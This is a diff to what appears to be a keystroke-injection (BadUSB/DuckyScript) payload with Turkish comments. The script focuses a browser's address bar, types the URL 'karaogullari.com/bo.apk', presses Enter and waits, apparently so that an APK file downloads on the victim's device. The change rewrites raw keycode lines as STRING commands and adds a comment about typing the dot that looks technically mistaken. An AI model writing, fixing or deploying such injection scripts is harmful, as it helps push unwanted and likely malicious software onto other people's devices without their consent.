@@ -9,33 +9,15 @@ DELAY 700
 CTRL l
 DELAY 300
 
-REM URL yazma (HID keycodes kullanarak)
-REM "karaogullari.com/bo.apk"
+REM URL yazma (ASCII kodları kullanarak)
+STRING karaogullari
+DELAY 300
 
-KEYCODE 0x0E   # k
-KEYCODE 0x04   # a
-KEYCODE 0x15   # r
-KEYCODE 0x04   # a
-KEYCODE 0x12   # o
-KEYCODE 0x0B   # g
-KEYCODE 0x18   # u
-KEYCODE 0x0F   # l
-KEYCODE 0x0F   # l
-KEYCODE 0x04   # a
-KEYCODE 0x15   # r
-KEYCODE 0x0C   # i
-KEYCODE 0x37   # .
-KEYCODE 0x06   # c
-KEYCODE 0x12   # o
-KEYCODE 0x10   # m
-KEYCODE 0x31   # /
-KEYCODE 0x05   # b
-KEYCODE 0x12   # o
-KEYCODE 0x31   # /
-KEYCODE 0x04   # a
-KEYCODE 0x13   # p
-KEYCODE 0x0E   # k
+REM Nokta (.) yazmak için SHIFT ile birlikte 0x37 kullanılır
+SHIFT 0x37
+DELAY 100
 
+STRING com/bo.apk
 DELAY 300
 ENTER
 DELAY 5000
